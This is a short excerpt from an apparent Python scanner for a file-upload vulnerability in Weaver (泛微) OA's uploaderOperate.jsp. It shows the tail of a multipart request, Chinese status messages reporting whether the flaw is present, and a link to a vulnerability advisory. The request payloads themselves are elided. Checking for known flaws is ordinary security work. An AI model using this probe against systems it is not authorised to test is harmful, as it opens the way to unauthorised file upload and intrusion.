...
------WebKitFormBoundarymVk33liI64J7GQaK'''
    ...
    print(now_time() + " [INFO]     正在泛微 OA uploaderOperate.jsp 文件上传漏洞#2022")
    try:
        ...
        if response1.status_code == 200 and response2.status_code == 200:
            print(now_time() + ' [SUCCESS]  泛微 OA uploaderOperate.jsp 文件上传漏洞存在 #2022')
            print(now_time() + ' [SUCCESS]  详细https://tvd.wuthreat.com/#/listDetail?TVDID=TVD-2022-15578')
        else:
            print(now_time() + ' [WARNING]  泛微2022 OA uploaderOperate.jsp 文件上传漏洞不存在')
    except:
        print(now_time() + ' [WARNING]  目标连接超时，或者目标不存在')
